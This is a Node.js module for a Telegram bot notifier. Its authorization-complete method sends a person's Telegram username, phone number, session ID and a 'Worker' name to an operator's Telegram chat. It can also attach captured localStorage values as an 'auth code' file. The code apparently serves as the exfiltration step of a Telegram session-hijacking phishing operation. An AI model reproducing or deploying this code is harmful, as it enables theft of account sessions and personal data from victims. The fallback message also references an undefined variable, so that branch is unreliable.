const axios = require('axios');
const {
  PrismaClient
} = require('@prisma/client');
require('dotenv').config();

const prisma = new PrismaClient();

class TelegramBotNotifier {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.enabled = !!(this.botToken && this.chatId);

    if (!this.enabled) {
      console.log('⚠️ Telegram bot notification disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID environment variables');
    } else {
      console.log('✅ Telegram bot notification enabled');
    }
  }

  /**
   * Send a notification message to the configured Telegram chat
   * @param {string} message - The message to send
   * @param {Object} options - Additional options for the message
   * @returns {Promise<boolean>} - Success status
   */
  async sendNotification(message, options = {}) {
    if (!this.enabled) {
      console.log('📱 Telegram notification skipped (disabled):', message);
      return false;
    }

    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

      const payload = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...options
      };

      console.log('📱 Sending Telegram notification...');
      const response = await axios.post(url, payload, {
        timeout: 10000, // 10 second timeout
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.data.ok) {
        console.log('✅ Telegram notification sent successfully');
        return true;
      } else {
        console.error('❌ Telegram API error:', response.data);
        return false;
      }
    } catch (error) {
      console.error('❌ Failed to send Telegram notification:', error.message);
      if (error.response) {
        console.error('❌ Response data:', error.response.data);
      }
      return false;
    }
  }

  /**
   * Send a file to the configured Telegram chat
   * @param {string} filePath - Path to the file to send
   * @param {string} caption - Caption for the file
   * @returns {Promise<boolean>} - Success status
   */
  async sendFile(filePath, caption = '') {
    if (!this.enabled) {
      console.log('📁 Telegram file send skipped (disabled):', filePath);
      return false;
    }

    try {
      const FormData = require('form-data');
      const fs = require('fs');

      const form = new FormData();
      form.append('chat_id', this.chatId);
      form.append('document', fs.createReadStream(filePath));
      if (caption) {
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');
      }

      console.log('📁 Sending file to Telegram...');
      const response = await axios.post(`https://api.telegram.org/bot${this.botToken}/sendDocument`, form, {
        headers: {
          ...form.getHeaders()
        },
        timeout: 30000 // 30 second timeout for file uploads
      });

      if (response.data.ok) {
        console.log('✅ File sent successfully');
        return true;
      } else {
        console.error('❌ Telegram API error:', response.data);
        return false;
      }
    } catch (error) {
      console.error('❌ Failed to send file:', error.message);
      if (error.response) {
        console.error('❌ Response data:', error.response.data);
      }
      return false;
    }
  }

  /**
   * Send authorization completion notification
   * @param {string} sessionId - The session ID
   * @param {Object} userInfo - User information
   * @param {string} authCode - The authorization code (localStorage values)
   * @param {boolean} includeAuthFile - Whether to include the auth file as attachment
   * @param {string} userId - The user ID to fetch username from database
   * @returns {Promise<boolean>} - Success status
   */
  async sendAuthorizationComplete(sessionId, userInfo = {}, authCode = null, includeAuthFile = false, userId = null) {
    const timestamp = new Date().toLocaleString();
    const telegramUsername = userInfo.username || 'Unknown';
    const phoneNumber = userInfo.phoneNumber || 'Unknown';
    let internalUsername = 'Unknown';

    // Try to get internal username from database if userId is provided
    if (userId) {
      try {
        const user = await prisma.user.findUnique({
          where: {
            id: userId
          },
          select: {
            username: true,
            tg_username: true
          }
        });

        if (user) {
          internalUsername = user.username || 'Unknown';
          console.log(`👤 Fetched internal username from database: ${internalUsername} (userId: ${userId})`);
        }
      } catch (error) {
        console.error('❌ Error fetching user from database:', error.message);
        // Continue with default internal username if database fetch fails
      }
    }

    try {
      // Create base message
      const message = `🎉 <b>Authorization Completed!</b>

📱 <b>Session ID:</b> <code>${sessionId}</code>
👤 <b>Username:</b> ${telegramUsername}
👷 <b>Worker:</b> ${internalUsername}
📞 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${timestamp}`;

      if (includeAuthFile && authCode) {
        // Include auth file as attachment
        const fs = require('fs');
        const path = require('path');

        // Create a temporary file for the authorization code
        const fileName = `auth-code-${sessionId}-${Date.now()}.txt`;
        const filePath = path.join(__dirname, 'temp', fileName);

        // Ensure temp directory exists
        const tempDir = path.join(__dirname, 'temp');
        if (!fs.existsSync(tempDir)) {
          fs.mkdirSync(tempDir, {
            recursive: true
          });
        }

        // Create the file content with session info
        const fileContent = `// Authorization Code
// Session ID: ${sessionId}
// Username: ${telegramUsername}
// Worker: ${internalUsername}
// Date & Time: ${timestamp}

${authCode}`;

        // Write the file
        fs.writeFileSync(filePath, fileContent, 'utf8');

        // Send the message with file attachment
        const success = await this.sendFile(filePath, message);

        // Clean up the temporary file
        try {
          fs.unlinkSync(filePath);
        } catch (cleanupError) {
          console.log('⚠️ Could not clean up temp file:', cleanupError.message);
        }

        return success;
      } else {
        // Send message without file attachment
        return await this.sendNotification(message);
      }
    } catch (error) {
      console.error('❌ Error creating/sending message:', error.message);
      // Fallback to sending as regular message
      let fallbackMessage = `🎉 <b>Authorization Completed!</b>

📱 <b>Session ID:</b> <code>${sessionId}</code>
👤 <b>Username:</b> ${username}
📞 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${timestamp}`;

      // Only include auth code in fallback if includeAuthFile is true
      if (includeAuthFile && authCode) {
        fallbackMessage += `\n\n<pre>${authCode.substring(0, 2000) + (authCode.length > 2000 ? '...' : '')}</pre>`;
      }

      return await this.sendNotification(fallbackMessage);
    }
  }

  /**
   * Send error notification
   * @param {string} sessionId - The session ID
   * @param {string} error - Error message
   * @returns {Promise<boolean>} - Success status
   */
  async sendError(sessionId, error) {
    const timestamp = new Date().toLocaleString();

    const message = `❌ <b>Authorization Error</b>

📱 <b>Session ID:</b> <code>${sessionId}</code>
🚨 <b>Error:</b> ${error}
⏰ <b>Time:</b> ${timestamp}`;

    return await this.sendNotification(message);
  }

  /**
   * Send test notification
   * @returns {Promise<boolean>} - Success status
   */
  async sendTestNotification() {
    const message = `🧪 <b>Test Notification</b>

This is a test message to verify that the Telegram bot integration is working correctly.

⏰ <b>Time:</b> ${new Date().toLocaleString()}`;

    return await this.sendNotification(message);
  }
}

// Create singleton instance
const telegramNotifier = new TelegramBotNotifier();

module.exports = telegramNotifier;